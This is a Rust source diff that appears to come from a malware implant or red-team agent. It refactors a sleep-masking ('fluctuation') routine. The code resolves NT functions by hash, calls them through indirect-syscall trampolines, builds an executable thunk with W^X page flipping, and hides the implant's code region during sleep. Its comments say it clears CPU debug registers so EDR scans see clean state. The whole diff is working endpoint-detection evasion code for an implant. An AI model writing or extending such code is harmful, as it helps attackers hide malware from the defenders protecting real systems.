@@ -68,34 +68,54 @@ impl<'a> Drop for DrGuard<'a> {
 }
 
 unsafe fn do_fluctuate(seconds: u32) -> bool {
+    let (rt, region, page, prot_tramp, delay_tramp) = match do_fluctuate_resolve() {
+        Some(v) => v,
+        None => return false,
+    };
+    if !do_fluctuate_build(rt, page, prot_tramp, delay_tramp, region.base, region.len, seconds) {
+        return false;
+    }
+    do_fluctuate_execute(rt, page)
+}
+
+/// Resolve the syscall runtime, SSNs/trampolines and allocate the RW thunk page.
+/// Returns None on any resolution/allocation failure (caller degrades to a
+/// plain unmasked sleep cycle).
+unsafe fn do_fluctuate_resolve() -> Option<(
+    &'static crate::syscalls::Runtime,
+    crate::sleep::TextRegion,
+    *mut c_void,
+    usize,
+    usize,
+)> {
     let rt = match crate::syscalls::global() {
         Some(r) => r,
-        None => return false,
+        None => return None,
     };
     let region = match crate::sleep::own_text_region() {
         Some(r) => r,
-        None => return false,
+        None => return None,
     };
 
     let prot_hash = crate::resolve::djb2(b"ntprotectvirtualmemory");
     let delay_hash = crate::resolve::djb2(b"ntdelayexecution");
     let prot_ssn = match rt.ssn_by_hash(prot_hash) {
         Some(s) => s,
-        None => return false,
+        None => return None,
     };
     let delay_ssn = match rt.ssn_by_hash(delay_hash) {
         Some(s) => s,
-        None => return false,
+        None => return None,
     };
     let prot_tramp = rt.trampoline_for(prot_ssn) as usize;
     let delay_tramp = rt.trampoline_for(delay_ssn) as usize;
     if prot_tramp == 0 || delay_tramp == 0 {
-        return false;
+        return None;
     }
 
     let nt_alloc_va = match resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
         Some(a) => a,
-        None => return false,
+        None => return None,
     };
     type NtAlloc =
         unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
@@ -106,14 +126,27 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     // be both writable and executable at the same time (implant-evasion-4).
     let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x04);
     if st < 0 || page.is_null() {
-        return false;
+        return None;
     }
+    Some((rt, region, page, prot_tramp, delay_tramp))
+}
 
+/// Build the fluctuation thunk into the RW page and flip it to
+/// PAGE_EXECUTE_READ. On flip failure the page is freed and false returned.
+unsafe fn do_fluctuate_build(
+    rt: &crate::syscalls::Runtime,
+    page: *mut c_void,
+    prot_tramp: usize,
+    delay_tramp: usize,
+    region_base: usize,
+    region_len: usize,
+    seconds: u32,
+) -> bool {
     let thunk = crate::fluctuation_thunk::build(
         prot_tramp,
         delay_tramp,
-        region.base as usize,
-        region.len,
+        region_base,
+        region_len,
         seconds,
         // CRIT-5: pass `mem::unmask` so the thunk can call it inline after the
         // RX restore, closing the hardware-exception window (see thunk docs).
@@ -123,11 +156,13 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
         crate::mem::unmask as *const () as usize,
     );
     core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
+    do_fluctuate_flip(rt, page)
+}
 
-    // W^X: the thunk page is RW only while we write it, then flipped to
-    // PAGE_EXECUTE_READ (0x20) before executing — never RWX (implant-evasion-4).
-    // A page that cannot be made executable is never run: free it and degrade
-    // to a plain (unmasked) sleep cycle.
+/// W^X: flip the thunk page to PAGE_EXECUTE_READ (0x20) before executing —
+/// never RWX (implant-evasion-4). A page that cannot be made executable is
+/// never run: free it and degrade to a plain (unmasked) sleep cycle.
+unsafe fn do_fluctuate_flip(rt: &crate::syscalls::Runtime, mut page: *mut c_void) -> bool {
     let mut prot_base = page as usize;
     let mut prot_sz: usize = 0x1000;
     let mut old_prot: u32 = 0;
@@ -151,7 +186,11 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
         free(!0usize, &mut page, &mut fsz, 0x8000);
         return false;
     }
+    true
+}
 
+/// Sanitize debug registers, run the thunk (masked sleep) and free the page.
+unsafe fn do_fluctuate_execute(rt: &crate::syscalls::Runtime, mut page: *mut c_void) -> bool {
     // ---- Countermeasure: DR sanitization during sleep ----
     // Save DR0-DR7, clear them so EDR async thread scans during
     // PAGE_NOACCESS sleep see clean debug registers. Restore
